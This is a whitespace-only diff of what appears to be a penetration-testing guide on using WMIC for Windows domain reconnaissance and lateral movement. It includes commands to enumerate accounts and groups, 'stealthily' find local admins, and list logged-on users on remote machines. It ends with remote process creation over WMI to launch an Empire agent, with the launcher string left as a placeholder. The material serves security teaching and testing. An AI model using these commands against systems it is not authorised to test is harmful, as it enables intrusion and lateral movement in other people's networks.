@@ -106,7 +106,7 @@ wmic process list /format:list
 wmic ntdomain list /format:list  
 wmic useraccount list /format:list  
 wmic group list /format:list  
-wmic sysaccount list /format:list  
+wmic sysaccount list /format:list
 ```
 
 ```bash
@@ -118,25 +118,25 @@ wmic sysaccount list /format:list
 For example, here's a very stealthy way to discover local admins on a remote machine \(note that domain is the computer name\):
 
 ```bash
-wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
+wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
 ```
 
 Another useful oneliner is to see who is logged on to a machine \(for when you're hunting admins\):
 
 ```text
-wmic /node:ordws01 path win32_loggedonuser get antecedent  
+wmic /node:ordws01 path win32_loggedonuser get antecedent
 ```
 
 `wmic` can even read nodes from a text file and execute the command on all of them. If you have a text file of workstations:
 
 ```text
-wmic /node:@workstations.txt path win32_loggedonuser get antecedent  
+wmic /node:@workstations.txt path win32_loggedonuser get antecedent
 ```
 
 **We'll remotely create a process over WMI to execute a Empire agent:**
 
 ```bash
-wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
+wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
 ```
 
 We see it executed successfully \(ReturnValue = 0\). And a second later our Empire listener catches it. Note the process ID is the same as WMI returned.
